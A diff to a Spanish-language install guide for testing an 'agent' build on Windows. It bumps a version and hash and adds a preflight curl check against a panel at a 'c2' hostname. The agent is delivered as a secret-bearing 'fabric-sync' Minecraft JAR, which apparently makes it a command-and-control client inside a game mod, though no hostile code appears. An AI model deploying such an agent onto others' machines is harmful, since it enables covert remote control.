@@ -1,9 +1,9 @@
 # Prueba del agente en Windows (dualboot)
 
-Build preparado: `windows-dualboot` · `0.3.9` · perfil `full`.  
+Build preparado: `windows-dualboot-v2` · `0.4.0` · perfil `full`.  
 Panel: <https://c2.spc-labpanel.com>  
-Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot` → descargar.  
-SHA-256 esperado: `6197412525e3c385f376c6fe1cb18d7684be1887537adb3a9333f215cef85037`.
+Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot-v2` → descargar.  
+SHA-256 esperado: `890c0b27e19b7aa9c18d5a669a85e56d18b9ea0856b084e819463816d11440b8`.
 
 No compartas el JAR: lleva el `build_secret` del build.
 
@@ -15,13 +15,24 @@ No compartas el JAR: lleva el `build_secret` del build.
   sincroniza la hora en Windows (`Configuración → Hora e idioma → Sincronizar ahora`)
   y, en PowerShell como administrador, `w32tm /resync`.
 
+## Preflight antes de tocar Minecraft
+
+En PowerShell:
+
+```powershell
+curl.exe -i https://c2.spc-labpanel.com/api/v1/preflight
+[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+```
+
+Debe responder `200` con `ok:true`. Compara `server_time` con la hora UTC local; si difieren más de 300 s, sincroniza el reloj antes de seguir.
+
 ## Instalación
 
 1. Abre <https://c2.spc-labpanel.com> en Windows e inicia sesión con TOTP.
-2. Entra en **Builds**, busca `windows-dualboot`, descarga el JAR y comprueba el hash:
+2. Entra en **Builds**, busca `windows-dualboot-v2`, descarga el JAR y comprueba el hash:
 
    ```powershell
-   Get-FileHash "$env:USERPROFILE\Downloads\fabric-sync-0.3.9-*.jar" -Algorithm SHA256
+   Get-FileHash "$env:USERPROFILE\Downloads\fabric-sync-0.4.0-*.jar" -Algorithm SHA256
    ```
 
 3. Instala Java 17 x64 (Temurin): <https://adoptium.net/temurin/releases/?version=17>.
